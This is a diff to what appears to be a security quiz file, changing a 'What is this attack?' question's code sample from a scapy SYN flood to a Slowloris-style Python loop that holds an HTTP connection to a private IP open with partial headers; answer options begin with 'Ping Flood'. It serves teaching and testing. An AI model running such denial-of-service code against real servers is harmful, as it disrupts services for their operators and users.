@@ -1316,15 +1316,26 @@ send(packet)
         question: `
 What is this attack?
 
-from scapy.all import *
+import socket
 import time
 
 target_ip = "10.0.0.5"
 target_port = 80
 
+# Establish a connection to the web server
+socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+socket.connect((target_ip, target_port))
+
+# Send an incomplete HTTP request header
+socket.send(b"GET / HTTP/1.1\r\n")
+socket.send(b"Host: example.com\r\n")
+
+# Continuously send more header lines to keep the connection alive
+# without ever finishing the request. An actual attack would
+# do this with hundreds or thousands of connections at once.
 while True:
-    syn = IP(dst=target_ip)/TCP(dport=target_port, flags='S')
-    syn_ack = sr1(syn, verbose=0)
+    socket.send(b"X-a: b\r\n")
+    time.sleep(15)
     `,
         answers: [
             "Ping Flood",
